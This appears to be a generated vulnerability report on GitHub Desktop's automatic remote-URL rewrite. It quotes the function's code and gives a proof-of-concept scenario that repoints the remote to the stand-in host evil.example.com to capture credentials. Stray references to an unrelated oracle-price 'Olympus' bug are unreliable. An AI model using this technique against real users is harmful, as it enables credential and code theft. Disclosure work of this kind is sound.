### Title
Silent remote URL rewrite to attacker-controlled host via unverified GitHub API `clone_url` - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
GitHub Desktop automatically rewrites a repository's local git remote URL whenever it detects that the associated `GitHubRepository`'s `clone_url` (fetched from the GitHub API) differs from the current `git remote` URL. The guard that is supposed to prevent unwanted rewrites only checks that the URL *protocol* (`https:`/`ssh:`) hasn't changed — it never checks that the *hostname* is unchanged. This mirrors the Olympus bug pattern: a narrow, easily-satisfied consistency check (oracle price tolerance / protocol match) is used as a proxy for "this update is safe," while the actual value that matters (price / host) is left unchecked, letting an attacker slip a malicious value through the gap.

### Finding Description
`updateRemoteUrl` decides whether to call `gitStore.setRemoteURL()` (i.e. `git remote set-url`) based on three conditions: [1](#0-0) 

- `remoteUrlUnchanged`: the user hasn't manually repointed their remote away from the previously known `gitHubRepository.cloneURL`.
- `protocolsMatch`: only compares `URL.parse(url).protocol` between the old and new URL — i.e. `"https:" === "https:"`.
- `!urlsMatch`: the new `apiRepo.clone_url` differs (by owner/name/host, via `urlMatchesRemote`/`parseRemote`) from the current remote.

If all three hold, Desktop silently runs `git remote set-url origin <apiRepo.clone_url>` with **no user confirmation and no hostname pinning**. `protocolsMatch` never inspects `hostname`, so an `apiRepo.clone_url` of `https://evil.example.com/owner/repo.git` passes the same check as a legitimate `https://github.com/owner/repo.git` rename. `apiRepo` is data returned by the GitHub API (`IAPIRepository`) — for GitHub Enterprise or any endpoint the app is configured to talk to, this is attacker-influenceable content (e.g., a malicious/compromised GHES instance, or repo-metadata desync from a transfer/rename race), which is exactly the "attacker controls a GitHub API object" primitive called out as valid impact.

The existing guards (`remoteUrlUnchanged`, `protocolsMatch`) are the equivalent of the oracle-price tolerance check in the original report: they look plausible but validate the wrong invariant (protocol scheme instead of destination host), so the actual corrupted value — the destination the user's future `git push`/`git fetch` traffic and credentials go to — is left unguarded.

### Impact Explanation
Once the remote is silently repointed to an attacker-controlled host:
- The next `push`/`fetch`/`pull` sends the user's credentials (via `envForRemoteOperation`/credential helper) and repository contents to the attacker's server instead of the intended GitHub/GHES host, matching the "credential/token exfiltration" and "git remote/proxy response" attacker classes. [2](#0-1) 
- Subsequent fetches merge attacker-supplied refs/objects into the user's local repository under the belief they came from the original remote — a silent corruption of what the user later commits/pushes, since Desktop never asked the user to confirm the new destination.
- The rewrite happens transparently as part of routine GitHub-repository refresh logic, not a distinct user action, so a user has no obvious opportunity to notice or reject the change.

### Likelihood Explanation
The trigger only requires that Desktop refresh a tracked `GitHubRepository`'s metadata (a routine background/foreground operation) and receive an `IAPIRepository` whose `clone_url` differs in host from the current remote while still matching in protocol — a condition satisfiable by any API/server capable of returning a `clone_url` field with an attacker-chosen host (e.g. malicious or compromised custom GitHub Enterprise endpoint, or metadata inconsistency during a repo rename/transfer). No local access, elevated privileges, or prior compromise of the user's machine is required.

### Recommendation
Strengthen `updateRemoteUrl`'s guard to compare the full parsed identity of the URL (protocol **and** hostname) rather than protocol alone before silently rewriting a remote, e.g. require `parsedRemoteUrl.hostname === parsedUpdatedRemoteUrl.hostname` in addition to `protocolsMatch`. Additionally, any automatic change to `remote.url` (a destination for credentials and code) should prompt for explicit user confirmation rather than executing `setRemoteURL` unattended, consistent with the report's own recommendation to add a confirmation/delay gate before trusting a newly-observed value.

### Proof of Concept
1. User has a repository cloned from `https://github.com/owner/repo.git`, tracked as a `GitHubRepository` in Desktop.
2. Attacker controls (or spoofs the response of) the GitHub API/Enterprise endpoint Desktop queries for this repository's metadata, returning `clone_url: "https://evil.example.com/owner/repo.git"`.
3. Desktop's periodic repository refresh calls `updateRemoteUrl(gitStore, gitHubRepository, apiRepo)`:
   - `remoteUrlUnchanged` is `true` (user never manually edited the remote).
   - `protocolsMatch` is `true` (`https:` === `https:`), even though the hosts differ.
   - `urlsMatch` is `false` (owner/host differ from `parseRemote`'s perspective).
4. The condition on `app/src/lib/stores/updates/update-remote-url.ts:42` is satisfied, and `gitStore.setRemoteURL('origin', 'https://evil.example.com/owner/repo.git')` executes silently.
5. On the user's next push/pull, git credentials and repository data are sent to `evil.example.com` instead of GitHub, with no dialog ever shown to the user.

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L18-44)
```typescript
  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```

**File:** app/src/lib/git/push.ts (L76-82)
```typescript
  let opts: IGitStringExecutionOptions = {
    env: await envForRemoteOperation(remote.url),
    interceptHooks: ['pre-push'],
    onHookProgress: options?.onHookProgress,
    onHookFailure: options?.onHookFailure,
    onTerminalOutputAvailable: options?.onTerminalOutputAvailable,
  }
```
